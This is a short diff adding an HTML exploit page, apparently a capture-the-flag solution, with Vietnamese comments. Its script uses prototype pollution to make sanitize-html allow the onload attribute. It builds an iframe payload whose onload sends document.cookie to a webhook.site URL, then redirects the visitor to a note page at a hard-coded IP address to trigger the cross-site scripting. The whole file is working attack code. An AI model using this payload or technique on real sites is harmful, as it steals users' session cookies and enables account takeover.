@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"></head>
+<body>
+<script>
+    // Bypass sanitize-html bằng prototype pollution
+    Object.prototype["*"] = ["onload"];
+
+    // Payload chứa iframe có onload
+    const payload = `<iframe onload="fetch('https://webhook.site/abcdefg-1234-xxxx?c='+document.cookie)">`;
+
+    // Chuyển hướng tới trang note chứa XSS
+    location.href = "http://34.134.162.213:17002/?note=" + encodeURIComponent(payload);
+</script>
+</body>
+</html>
